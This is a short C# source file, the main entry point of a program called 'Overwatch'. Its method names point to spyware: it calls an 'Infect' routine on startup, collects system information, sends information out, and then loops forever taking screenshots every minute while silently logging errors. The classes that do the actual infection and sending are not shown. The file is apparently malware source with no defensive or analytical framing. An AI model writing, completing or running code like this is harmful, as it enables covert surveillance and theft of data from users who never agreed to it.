using System;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();

        static void Main(string[] args)
        {
            try
            {
                cStartupOptions.ProcessStartInfo();
                cChangeLabel.Infect(args);
                cReceiveInformation info = new cReceiveInformation();
                info.Overview();
                cSendingInformation s = new cSendingInformation();
                s.Sending();
                while (true)
                {
                    info.ScreenShoot();
                    info.Start();
                    System.Threading.Thread.Sleep(60000);
                }

            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
    }
}
